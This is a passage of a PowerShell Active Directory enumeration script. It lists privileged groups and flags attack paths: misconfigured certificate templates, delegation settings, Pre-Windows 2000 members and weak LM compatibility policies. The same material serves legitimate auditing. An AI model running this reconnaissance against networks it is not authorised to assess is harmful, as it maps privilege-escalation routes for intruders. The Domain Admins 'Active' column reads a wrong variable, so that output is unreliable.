				"Last Logon" = (Get-DomainUser -Identity $EnterpriseAdmin.MemberName -Domain $Domain -Server $Server).lastlogontimestamp
				"Member SID" = $EnterpriseAdmin.MemberSID
				"Group Domain" = $EnterpriseAdmin.GroupDomain
			}
		}

		if ($TempEnterpriseAdmins) {
			$TempEnterpriseAdmins | ft -Autosize -Wrap
			$HTMLEnterpriseAdmins = $TempEnterpriseAdmins | ConvertTo-Html -Fragment -PreContent "<h2>Enterprise Administrators</h2>"
		}
	}
	else {
		$TempEnterpriseAdmins = foreach ($AllDomain in $AllDomains) {
			$EnterpriseAdmins = Get-DomainGroupMember -Domain $AllDomain -Identity "Enterprise Admins" -Recurse
			foreach($EnterpriseAdmin in $EnterpriseAdmins){
				[PSCustomObject]@{
					"Member Name" = $EnterpriseAdmin.MemberName
					"Enabled" = if ($EnterpriseAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ((Get-DomainUser -Identity $EnterpriseAdmin.MemberName -Domain $AllDomain).lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"Last Logon" = (Get-DomainUser -Identity $EnterpriseAdmin.MemberName -Domain $AllDomain).lastlogontimestamp
					"Member SID" = $EnterpriseAdmin.MemberSID
					"Group Domain" = $EnterpriseAdmin.GroupDomain
				}
			}
		}
		
		if ($TempEnterpriseAdmins) {
			$TempEnterpriseAdmins | ft -Autosize -Wrap
			$HTMLEnterpriseAdmins = $TempEnterpriseAdmins | ConvertTo-Html -Fragment -PreContent "<h2>Enterprise Administrators</h2>"
		}
	}
	
	##################################################
    ########### Domain Administrators ################
	##################################################
	
	Write-Host ""
    Write-Host "Domain Administrators:" -ForegroundColor Cyan
    if ($Domain -and $Server) {
		$DomainAdmins = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Domain Admins" -Recurse
		$TempDomainAdmins = foreach ($DomainAdmin in $DomainAdmins) {
			[PSCustomObject]@{
				"Member Name" = $DomainAdmin.MemberName
				"Enabled" = if ($DomainAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ((Get-DomainUser -Identity $EnterpriseAdmin.MemberName -Domain $Domain -Server $Server).lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
				"Last Logon" = (Get-DomainUser -Identity $DomainAdmin.MemberName -Domain $Domain -Server $Server).lastlogontimestamp
				"Member SID" = $DomainAdmin.MemberSID
				"Group Domain" = $DomainAdmin.GroupDomain
			}
		}

		if ($TempDomainAdmins) {
			$TempDomainAdmins | ft -Autosize -Wrap
			$HTMLDomainAdmins = $TempDomainAdmins | ConvertTo-Html -Fragment -PreContent "<h2>Domain Administrators</h2>"
		}
	}
	else {
		$TempDomainAdmins = foreach ($AllDomain in $AllDomains) {
			$DomainAdmins = Get-DomainGroupMember -Domain $AllDomain -Identity "Domain Admins" -Recurse
			foreach ($DomainAdmin in $DomainAdmins) {
				[PSCustomObject]@{
					"Member Name" = $DomainAdmin.MemberName
					"Enabled" = if ($DomainAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ((Get-DomainUser -Identity $EnterpriseAdmin.MemberName -Domain $AllDomain).lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"Last Logon" = (Get-DomainUser -Identity $DomainAdmin.MemberName -Domain $AllDomain).lastlogontimestamp
					"Member SID" = $DomainAdmin.MemberSID
					"Group Domain" = $DomainAdmin.GroupDomain
				}
			}
		}

		if ($TempDomainAdmins) {
			$TempDomainAdmins | ft -Autosize -Wrap
			$HTMLDomainAdmins = $TempDomainAdmins | ConvertTo-Html -Fragment -PreContent "<h2>Domain Administrators</h2>"
		}
	}
	
	############################################################
    ############# Current User Group Membership ################
	############################################################
	
	Write-Host ""
    Write-Host "Groups the current user is part of:" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Current User: $env:USERNAME"
    if($Domain -AND $Server) {
		$GetCurrUserGroups = Get-DomainGroup -Domain $Domain -Server $Server -UserName $env:USERNAME | Where-Object { $_.samaccountname -notlike "Domain Users" }
    	$TempGetCurrUserGroup = foreach($GetCurrUserGroup in $GetCurrUserGroups){
			[PSCustomObject]@{
				"Group Name" = $GetCurrUserGroup.samaccountname
				"Object SID" = $GetCurrUserGroup.objectsid
				Domain = $Domain
				"Members of this group (Users)" = ((Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity $GetCurrUserGroup.samaccountname).MemberName | Sort-Object -Unique) -join ' - '
			}
		}
		
		if($TempGetCurrUserGroup){
			$TempGetCurrUserGroup | ft -Autosize -Wrap
			$HTMLGetCurrUserGroup = $TempGetCurrUserGroup | ConvertTo-Html -Fragment -PreContent "<h2>Groups the current user is part of</h2>"
		}
    }
    else{
    	$TempGetCurrUserGroup = foreach($AllDomain in $AllDomains){
			$GetCurrUserGroups = Get-DomainGroup -Domain $AllDomain -UserName $env:USERNAME | Where-Object { $_.samaccountname -notlike "Domain Users" }
			foreach($GetCurrUserGroup in $GetCurrUserGroups){
				[PSCustomObject]@{
					"Group Name" = $GetCurrUserGroup.samaccountname
					"Object SID" = $GetCurrUserGroup.objectsid
					Domain = $AllDomain
					"Members of this group" = ((Get-DomainGroupMember -Domain $AllDomain -Recurse -Identity $GetCurrUserGroup.samaccountname).MemberName | Sort-Object -Unique) -join ' - '
				}
			}
		}
		
		if($TempGetCurrUserGroup){
			$TempGetCurrUserGroup | ft -Autosize -Wrap
			$HTMLGetCurrUserGroup = $TempGetCurrUserGroup | ConvertTo-Html -Fragment -PreContent "<h2>Groups the current user is part of</h2>"
		}
    }
	
	$MisconfigurationsBanner = "<h3>Configuration Flaws with Potential for Exploitation</h3>"
	Write-Host ""
	Write-Host "Configuration Flaws with Potential for Exploitation" -ForegroundColor Red
	Write-Host ""
	
	###############################################################
    ########### Misconfigured Certificate Templates ###############
	###############################################################
	if($NoVulnCertTemplates){}
	else{
		Write-Host ""
		Write-Host "Misconfigured Certificate Templates (do not rely solely on this output):" -ForegroundColor Cyan

		if ($Domain -and $Server) {
			$CertDomainName = "DC=" + $Domain.Split(".")
			$CertDomainName = $CertDomainName -replace " ", ",DC="
			$VulnCertUsers = Get-DomainObjectACL -Domain $Domain -Server $Server -SearchBase "CN=Configuration,$CertDomainName" -LDAPFilter "(objectclass=pkicertificatetemplate)" -ResolveGUIDs | %{ $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID -Domain $Domain -Server $Server $_.SecurityIdentifier.value) -Force; $_ } |  ?{ $_.Identity -match "Domain Users" } 
			$vulnCertComputers = Get-DomainObjectACL -Domain $Domain -Server $Server -SearchBase "CN=Configuration,$CertDomainName" -LDAPFilter "(objectclass=pkicertificatetemplate)" -ResolveGUIDs | %{ $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID -Domain $Domain -Server $Server $_.SecurityIdentifier.value) -Force; $_ } |  ?{ $_.Identity -match "Domain Computers" }
			$VulnCertFlags = Get-DomainObject -Domain $Domain -Server $Server -SearchBase "CN=Configuration,$CertDomainName" -LDAPFilter "(objectclass=pkicertificatetemplate)" | Where-Object {($_. "mspki-certificate-name-flag" -eq "1" -and $_.pkiextendedkeyusage -like "1.3.6.1.5.5.7.3.2") -and (($vulncertusers.ObjectDN -contains $_.distinguishedname) -or ($vulncertcomputers.ObjectDN -contains $_.distinguishedname))}
			$VulnCertUsersX = $VulnCertUsers | Where-Object {($_.ActiveDirectoryRights -match "WriteDacl") -or ($_.ActiveDirectoryRights -match "WriteOwner")}
			$vulnCertComputersX = $vulnCertComputers | Where-Object {($_.ActiveDirectoryRights -match "WriteDacl") -or ($_.ActiveDirectoryRights -match "WriteOwner")}
			
			
			$VulnCertTemplatesFlags = foreach ($vulncertflag in $VulnCertFlags) {
				[PSCustomObject]@{
					"Cert Template" = $vulncertflag.cn
					"Extended Key Usage" = "Client Authentication"
					"Flag" = "ENROLLEE_SUPPLIES_SUBJECT"
					"Enrollment Rights" = "Domain Users"
					"Domain" = $Domain
				}
			}
			
			$TempVulnCertComputers = foreach ($vulnCertComputer in $vulnCertComputersX) {
				[PSCustomObject]@{
					"Cert Template" = $vulnCertComputer.ObjectDN.Split(',')[0] -replace 'CN='
					"Identity" = "Domain Computers"
					"Active Directory Rights" = "WriteDacl or WriteOwner"
					"Domain" = $Domain
				}
			}
			
			$TempVulnCertUsers = foreach ($vulncertuser in $VulnCertUsersX) {
				[PSCustomObject]@{
					"Cert Template" = $vulncertuser.ObjectDN.Split(',')[0] -replace 'CN='
					"Identity" = "Domain Users"
					"Active Directory Rights" = "WriteDacl or WriteOwner"
					"Domain" = $Domain
				}
			}
			
			$VulnCertTemplatesFlags | Format-Table -AutoSize -Wrap
			$TempVulnCertComputers | Format-Table -AutoSize -Wrap
			$TempVulnCertUsers | Format-Table -AutoSize -Wrap
			
			if ($VulnCertTemplatesFlags) {
				$HTMLVulnCertTemplates = $VulnCertTemplatesFlags | ConvertTo-Html -Fragment -PreContent "<h2>Vulnerable Certificate Templates</h2>"
				$HTMLVulnCertComputers = $TempVulnCertComputers | ConvertTo-Html -Fragment
				$HTMLVulnCertUsers = $TempVulnCertUsers | ConvertTo-Html -Fragment
			}
			
			elseif ($TempVulnCertComputers) {
				$HTMLVulnCertComputers = $TempVulnCertComputers | ConvertTo-Html -Fragment -PreContent "<h2>Vulnerable Certificate Templates</h2>"
				$HTMLVulnCertUsers = $TempVulnCertUsers | ConvertTo-Html -Fragment
			}
			
			else{$HTMLVulnCertUsers = $TempVulnCertUsers | ConvertTo-Html -Fragment -PreContent "<h2>Vulnerable Certificate Templates</h2>"}
		}
		
		else {
			$VulnCertTemplatesFlags = foreach ($AllDomain in $AllDomains) {
				$CertDomainName = "DC=" + $AllDomain.Split(".")
				$CertDomainName = $CertDomainName -replace " ", ",DC="
				$VulnCertUsers = Get-DomainObjectACL -Domain $AllDomain -SearchBase "CN=Configuration,$CertDomainName" -LDAPFilter "(objectclass=pkicertificatetemplate)" -ResolveGUIDs | %{$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID -Domain $AllDomain $_.SecurityIdentifier.value) -Force; $_} | ?{ $_.Identity -match "Domain Users" }
				$vulnCertComputers = Get-DomainObjectACL -Domain $AllDomain -SearchBase "CN=Configuration,$CertDomainName" -LDAPFilter "(objectclass=pkicertificatetemplate)" -ResolveGUIDs | ForEach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID -Domain $AllDomain $_.SecurityIdentifier.value) -Force; $_ } | Where-Object { $_.Identity -match "Domain Computers" }
				$VulnCertFlags = Get-DomainObject -Domain $AllDomain -SearchBase "CN=Configuration,$CertDomainName" -LDAPFilter "(objectclass=pkicertificatetemplate)" | Where-Object {($_. "mspki-certificate-name-flag" -eq "1" -and $_.pkiextendedkeyusage -like "1.3.6.1.5.5.7.3.2") -and (($vulncertusers.ObjectDN -contains $_.distinguishedname) -or ($vulncertcomputers.ObjectDN -contains $_.distinguishedname))}
				foreach ($vulncertflag in $VulnCertFlags) {
					[PSCustomObject]@{
						"Cert Template" = $vulncertflag.cn
						"Extended Key Usage" = "Client Authentication"
						"Flag" = "ENROLLEE_SUPPLIES_SUBJECT"
						"Enrollment Rights" = "Domain Users"
						"Domain" = $AllDomain
					}
				}
			}
			
			$TempVulnCertComputers = foreach ($AllDomain in $AllDomains) {
				$CertDomainName = "DC=" + $AllDomain.Split(".")
				$CertDomainName = $CertDomainName -replace " ", ",DC="
				$vulnCertComputers = Get-DomainObjectACL -Domain $AllDomain -SearchBase "CN=Configuration,$CertDomainName" -LDAPFilter "(objectclass=pkicertificatetemplate)" -ResolveGUIDs | ForEach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID -Domain $AllDomain $_.SecurityIdentifier.value) -Force; $_ } | Where-Object { $_.Identity -match "Domain Computers" } | Where-Object {($_.ActiveDirectoryRights -match "WriteDacl") -or ($_.ActiveDirectoryRights -match "WriteOwner")}
				
				foreach ($vulnCertComputer in $vulnCertComputers) {
					[PSCustomObject]@{
						"Cert Template" = $vulnCertComputer.ObjectDN.Split(',')[0] -replace 'CN='
						"Identity" = "Domain Computers"
						"Active Directory Rights" = "WriteDacl or WriteOwner"
						"Domain" = $AllDomain
					}
				}
			}
			
			$TempVulnCertUsers = foreach ($AllDomain in $AllDomains) {
				$CertDomainName = "DC=" + $AllDomain.Split(".")
				$CertDomainName = $CertDomainName -replace " ", ",DC="
				$VulnCertUsers = Get-DomainObjectACL -Domain $AllDomain -SearchBase "CN=Configuration,$CertDomainName" -LDAPFilter "(objectclass=pkicertificatetemplate)" -ResolveGUIDs | %{$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID -Domain $AllDomain $_.SecurityIdentifier.value) -Force; $_} | ?{ $_.Identity -match "Domain Users" } | Where-Object {($_.ActiveDirectoryRights -match "WriteDacl") -or ($_.ActiveDirectoryRights -match "WriteOwner")}

				foreach ($vulncertuser in $VulnCertUsers) {
					[PSCustomObject]@{
						"Cert Template" = $vulncertuser.ObjectDN.Split(',')[0] -replace 'CN='
						"Identity" = "Domain Users"
						"Active Directory Rights" = "WriteDacl or WriteOwner"
						"Domain" = $AllDomain
					}
				}
			}

			$VulnCertTemplatesFlags | Format-Table -AutoSize -Wrap
			$TempVulnCertComputers | Format-Table -AutoSize -Wrap
			$TempVulnCertUsers | Format-Table -AutoSize -Wrap
			
			if ($VulnCertTemplatesFlags) {
				$HTMLVulnCertTemplates = $VulnCertTemplatesFlags | ConvertTo-Html -Fragment -PreContent "<h2>Vulnerable Certificate Templates</h2>"
				$HTMLVulnCertComputers = $TempVulnCertComputers | ConvertTo-Html -Fragment
				$HTMLVulnCertUsers = $TempVulnCertUsers | ConvertTo-Html -Fragment
			}
			
			elseif ($TempVulnCertComputers) {
				$HTMLVulnCertComputers = $TempVulnCertComputers | ConvertTo-Html -Fragment -PreContent "<h2>Vulnerable Certificate Templates</h2>"
				$HTMLVulnCertUsers = $TempVulnCertUsers | ConvertTo-Html -Fragment
			}
			
			else{$HTMLVulnCertUsers = $TempVulnCertUsers | ConvertTo-Html -Fragment -PreContent "<h2>Vulnerable Certificate Templates</h2>"}
		}
	}
	
	####################################################
    ########### Unconstrained Delegation ###############
	####################################################
	
	Write-Host ""
	Write-Host "Unconstrained Delegation:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$DCs = Get-DomainController -Domain $Domain -Server $Server
		$Unconstrained = Get-NetComputer -Domain $Domain -Server $Server -Unconstrained | Where-Object { $_.dnshostname -notmatch "($($DCs.Name -join ' - '))" }
		$TempUnconstrained = foreach ($Computer in $Unconstrained) {
			[PSCustomObject]@{
				"Name" = $Computer.samaccountname
				"Enabled" = if ($Computer.useraccountcontrol -band 2) { "False" } else { "True" }
				"IP Address" = Resolve-DnsName -Name $Computer.name -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
				"Account SID" = $Computer.objectsid
				"Operating System" = $Computer.operatingsystem
				"Domain" = $Domain
			}
		}

		if ($TempUnconstrained) {
			$TempUnconstrained | Format-Table -AutoSize -Wrap
			$HTMLUnconstrained = $TempUnconstrained | ConvertTo-Html -Fragment -PreContent "<h2>Unconstrained Delegation</h2>"
		}
	}
	
	else {
		$TempUnconstrained = foreach ($AllDomain in $AllDomains) {
			$Server = Get-DomainController -Domain $AllDomain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
			$DCs = Get-DomainController -Domain $AllDomain
			$Unconstrained = Get-NetComputer -Domain $AllDomain -Unconstrained | Where-Object { $_.dnshostname -notmatch "($($DCs.Name -join ' - '))" }
			foreach ($Computer in $Unconstrained) {
				[PSCustomObject]@{
					"Name" = $Computer.samaccountname
					"Enabled" = if ($Computer.useraccountcontrol -band 2) { "False" } else { "True" }
					"IP Address" = Resolve-DnsName -Name $Computer.name -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
					"Account SID" = $Computer.objectsid
					"Operating System" = $Computer.operatingsystem
					"Domain" = $AllDomain
				}
			}
		}

		if ($TempUnconstrained) {
			$TempUnconstrained | Format-Table -AutoSize -Wrap
			$HTMLUnconstrained = $TempUnconstrained | ConvertTo-Html -Fragment -PreContent "<h2>Unconstrained Delegation</h2>"
		}
	}

	
	#############################################################
    ########### Constrained Delegation (Computers)###############
	#############################################################

    Write-Host ""
	Write-Host "Constrained Delegation (Computers):" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$ConstrainedDelegationComputers = Get-DomainComputer -Domain $Domain -Server $Server -TrustedToAuth
		$TempConstrainedDelegationComputers = foreach ($ConstrainedDelegationComputer in $ConstrainedDelegationComputers) {
			[PSCustomObject]@{
				"Name" = $ConstrainedDelegationComputer.samaccountname
				"Enabled" = if ($ConstrainedDelegationComputer.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($ConstrainedDelegationComputer.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
				"IP Address" = Resolve-DnsName -Name $ConstrainedDelegationComputer.name -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
				"Account SID" = $ConstrainedDelegationComputer.objectsid
				"Operating System" = $ConstrainedDelegationComputer.operatingsystem
				Domain = $Domain
				"msds-AllowedToDelegateTo" = $ConstrainedDelegationComputer."msds-AllowedToDelegateTo" -join " - "
			}
		}

		if ($TempConstrainedDelegationComputers) {
			$TempConstrainedDelegationComputers | Format-Table -AutoSize -Wrap
			$HTMLConstrainedDelegationComputers = $TempConstrainedDelegationComputers | ConvertTo-Html -Fragment -PreContent "<h2>Constrained Delegation (Computers)</h2>"
		}
	}
	else {
		$TempConstrainedDelegationComputers = foreach ($AllDomain in $AllDomains) {
			$Server = Get-DomainController -Domain $AllDomain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
			$ConstrainedDelegationComputers = Get-DomainComputer -Domain $AllDomain -TrustedToAuth
			foreach ($ConstrainedDelegationComputer in $ConstrainedDelegationComputers) {
				[PSCustomObject]@{
					"Name" = $ConstrainedDelegationComputer.samaccountname
					"Enabled" = if ($ConstrainedDelegationComputer.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($ConstrainedDelegationComputer.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"IP Address" = Resolve-DnsName -Name $ConstrainedDelegationComputer.name -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
					"Account SID" = $ConstrainedDelegationComputer.objectsid
					"Operating System" = $ConstrainedDelegationComputer.operatingsystem
					Domain = $AllDomain
					"msds-AllowedToDelegateTo" = $ConstrainedDelegationComputer."msds-AllowedToDelegateTo" -join " - "
				}
			}
		}

		if ($TempConstrainedDelegationComputers) {
			$TempConstrainedDelegationComputers | Format-Table -AutoSize -Wrap
			$HTMLConstrainedDelegationComputers = $TempConstrainedDelegationComputers | ConvertTo-Html -Fragment -PreContent "<h2>Constrained Delegation (Computers)</h2>"
		}
	}

	
	#########################################################
    ########### Constrained Delegation (Users)###############
	#########################################################

    Write-Host ""
	Write-Host "Constrained Delegation (Users):" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$ConstrainedDelegationUsers = Get-DomainUser -Domain $Domain -Server $Server -TrustedToAuth
		$TempConstrainedDelegationUsers = foreach ($ConstrainedDelegationUser in $ConstrainedDelegationUsers) {
			[PSCustomObject]@{
				"Name" = $ConstrainedDelegationUser.Name
				"Enabled" = if ($ConstrainedDelegationUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($ConstrainedDelegationUser.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
				"Adm" = if ($ConstrainedDelegationUser.memberof -match 'Administrators') { "YES" } else { "NO" }
				"DA" = if ($ConstrainedDelegationUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				"EA" = if ($ConstrainedDelegationUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $ConstrainedDelegationUser.lastlogontimestamp
				"SID" = $ConstrainedDelegationUser.objectSID
				Domain = $Domain
				"msds-AllowedToDelegateTo" = $ConstrainedDelegationUser."msds-AllowedToDelegateTo" -join " - "
			}
		}

		if ($TempConstrainedDelegationUsers) {
			$TempConstrainedDelegationUsers | Format-Table -AutoSize -Wrap
			$HTMLConstrainedDelegationUsers = $TempConstrainedDelegationUsers | ConvertTo-Html -Fragment -PreContent "<h2>Constrained Delegation (Users)</h2>"
		}
	}
	else {
		$TempConstrainedDelegationUsers = foreach ($AllDomain in $AllDomains) {
			$ConstrainedDelegationUsers = Get-DomainUser -Domain $AllDomain -TrustedToAuth
			foreach ($ConstrainedDelegationUser in $ConstrainedDelegationUsers) {
				[PSCustomObject]@{
					"Name" = $ConstrainedDelegationUser.Name
					"Enabled" = if ($ConstrainedDelegationUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($ConstrainedDelegationUser.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"Adm" = if ($ConstrainedDelegationUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					"DA" = if ($ConstrainedDelegationUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					"EA" = if ($ConstrainedDelegationUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $ConstrainedDelegationUser.lastlogontimestamp
					"SID" = $ConstrainedDelegationUser.objectSID
					Domain = $AllDomain
					"msds-AllowedToDelegateTo" = $ConstrainedDelegationUser."msds-AllowedToDelegateTo" -join " - "
				}
			}
		}

		if ($TempConstrainedDelegationUsers) {
			$TempConstrainedDelegationUsers | Format-Table -AutoSize -Wrap
			$HTMLConstrainedDelegationUsers = $TempConstrainedDelegationUsers | ConvertTo-Html -Fragment -PreContent "<h2>Constrained Delegation (Users)</h2>"
		}
	}

	
	###########################################################
    ######## Resource Based Constrained Delegation ############
	###########################################################
    
    Write-Host ""
	Write-Host "Resource Based Constrained Delegation:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$domainSID = Get-DomainSID $Domain -Server $Server
		$RBACDObjects = Get-DomainComputer -Domain $Domain -Server $Server | Get-DomainObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs |
			Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "$domainSID-[\d]{4,10}" -and $_.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]) -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" } |
			ForEach-Object {
				[PSCustomObject]@{
					"Computer Object" = ([System.Security.Principal.SecurityIdentifier]$_.ObjectSID).Translate([System.Security.Principal.NTAccount])
					"AD Rights" = $_.ActiveDirectoryRights
					"Object Ace Type" = $_.ObjectAceType
					"Account" = ([System.Security.Principal.SecurityIdentifier]$_.SecurityIdentifier).Translate([System.Security.Principal.NTAccount])
				}
			}

		if ($RBACDObjects) {
			$RBACDObjects | Format-Table -AutoSize -Wrap
			$HTMLRBACDObjects = $RBACDObjects | ConvertTo-Html -Fragment -PreContent "<h2>Resource Based Constrained Delegation</h2>"
		}
	}
	else {
		$RBACDObjects = foreach ($AllDomain in $AllDomains) {
			$domainSID = Get-DomainSID $AllDomain
			Get-DomainComputer -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs |
				Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "$domainSID-[\d]{4,10}" -and $_.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]) -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" } |
				ForEach-Object {
					[PSCustomObject]@{
						"Computer Object" = ([System.Security.Principal.SecurityIdentifier]$_.ObjectSID).Translate([System.Security.Principal.NTAccount])
						"AD Rights" = $_.ActiveDirectoryRights
						"Object Ace Type" = $_.ObjectAceType
						"Account" = ([System.Security.Principal.SecurityIdentifier]$_.SecurityIdentifier).Translate([System.Security.Principal.NTAccount])
					}
				}
		}

		if ($RBACDObjects) {
			$RBACDObjects | Format-Table -AutoSize -Wrap
			$HTMLRBACDObjects = $RBACDObjects | ConvertTo-Html -Fragment -PreContent "<h2>Resource Based Constrained Delegation</h2>"
		}
	}
	
	############################################
    ########### Pre-Windows 2000 ###############
	############################################
	
	
	Write-Host ""
	Write-Host "Members of Pre-Windows 2000 Compatible Access group:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$PreWin2kCompatibleAccess = Get-DomainGroup -Domain $Domain -Server $Server -Identity "Pre-Windows 2000 Compatible Access"
		$PreWin2kCompatibleAccessMembers = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Pre-Windows 2000 Compatible Access" -Recurse | Where-Object { $_.MemberName -ne "Authenticated Users" }
		$TempPreWin2kCompatibleAccess = foreach ($Member in $PreWin2kCompatibleAccessMembers) {
			[PSCustomObject]@{
				"Member" = $Member | Select-Object -ExpandProperty MemberName
				"Enabled" = if ($Member.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ((Get-DomainComputer -Identity $Member.MemberName.TrimEnd('$') -Domain $Domain -Server $Server).lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
				"IP Address" = Resolve-DnsName -Name (($Member | Select-Object -ExpandProperty MemberName).TrimEnd('$')) -Type A -Server $Server| Select-Object -ExpandProperty IPAddress
				"Member SID" = $Member | Select-Object -ExpandProperty MemberSID
				"Operating System" = Get-DomainComputer $Member.MemberName.TrimEnd('$') -Domain $Domain -Server $Server | Select-Object -ExpandProperty operatingsystem
				"Object Class" = $Member | Select-Object -ExpandProperty MemberObjectClass
				"Domain" = $Domain
			}
		}

		if ($TempPreWin2kCompatibleAccess) {
			$TempPreWin2kCompatibleAccess | Format-Table -AutoSize -Wrap
			$HTMLPreWin2kCompatibleAccess = $TempPreWin2kCompatibleAccess | ConvertTo-Html -Fragment -PreContent "<h2>Members of Pre-Windows 2000 Compatible Access group</h2>"
		}
	}
	else {
		$TempPreWin2kCompatibleAccess = foreach ($AllDomain in $AllDomains) {
			$Server = Get-DomainController -Domain $AllDomain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
			$PreWin2kCompatibleAccess = Get-DomainGroup -Domain $AllDomain -Identity "Pre-Windows 2000 Compatible Access"
			$PreWin2kCompatibleAccessMembers = Get-DomainGroupMember -Domain $AllDomain -Identity "Pre-Windows 2000 Compatible Access" -Recurse | Where-Object { $_.MemberName -ne "Authenticated Users" }
			foreach ($Member in $PreWin2kCompatibleAccessMembers) {
				[PSCustomObject]@{
					"Member" = $Member | Select-Object -ExpandProperty MemberName
					"Enabled" = if ($Member.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ((Get-DomainComputer -Identity $Member.MemberName.TrimEnd('$') -Domain $AllDomain).lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"IP Address" = Resolve-DnsName -Name (($Member | Select-Object -ExpandProperty MemberName).TrimEnd('$')) -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
					"Member SID" = $Member | Select-Object -ExpandProperty MemberSID
					"Operating System" = Get-DomainComputer $Member.MemberName.TrimEnd('$') -Domain $AllDomain | Select-Object -ExpandProperty operatingsystem
					"Object Class" = $Member | Select-Object -ExpandProperty MemberObjectClass
					"Domain" = $AllDomain
				}
			}
		}

		if ($TempPreWin2kCompatibleAccess) {
			$TempPreWin2kCompatibleAccess | Format-Table -AutoSize -Wrap
			$HTMLPreWin2kCompatibleAccess = $TempPreWin2kCompatibleAccess | ConvertTo-Html -Fragment -PreContent "<h2>Members of Pre-Windows 2000 Compatible Access group</h2>"
		}
	}
	
	##################################################
    ########### LM Compatibility Level ###############
	##################################################
	
	Write-Host ""
	Write-Host "LM Compatibility Level:" -ForegroundColor Cyan

	$policySettings = @{
		"0" = "Send LM & NTLM responses"
		"1" = "Send LM & NTLM - use NTLMv2 session security if negotiated"
		"2" = "Send NTLM response only"
		"3" = "Send NTLMv2 response only"
		"4" = "Send NTLMv2 response only. Refuse LM"
		"5" = "Send NTLMv2 response only. Refuse LM & NTLM"
	}

	if ($Domain -and $Server) {
		$TempLMCompatibilityLevel = Get-DomainGPO -Domain $Domain -Server $Server -LDAPFilter "(name=*)" -Properties gpcfilesyspath, displayname |
			ForEach-Object {
				$gpoPath = $_.gpcfilesyspath.TrimStart("[").TrimEnd("]")
				$gpoDisplayName = $_.displayname
				$gpoSetting = (Get-Content -Path "$gpoPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" -Raw | Select-String -Pattern "LmCompatibilityLevel" | Select-Object -Last 1).Line
				$gpoSetting = ($gpoSetting | Out-String) -split "`n"
				$gpoSetting = $gpoSetting | Select-String -Pattern "LmCompatibilityLevel"
				$gpoSetting = ($gpoSetting | Out-String) -split "`n"
				$gpoSetting = $gpoSetting.Trim()
				$gpoSetting = $gpoSetting | Where-Object { $_ -ne "" }

				if ($gpoSetting) {
					$settingValue = ($gpoSetting -split "=")[-1].Trim().Split(",")[-1].Trim()
					$policySetting = $policySettings[$settingValue]

					[PSCustomObject]@{
						"GPO Name" = $gpoDisplayName
						Setting = $settingValue
						"LM Compatibility Level" = $policySetting
					}
				}
			}

		if ($TempLMCompatibilityLevel) {
			$TempLMCompatibilityLevel | Where-Object {$_.Setting -le 2} | Format-Table -AutoSize -Wrap
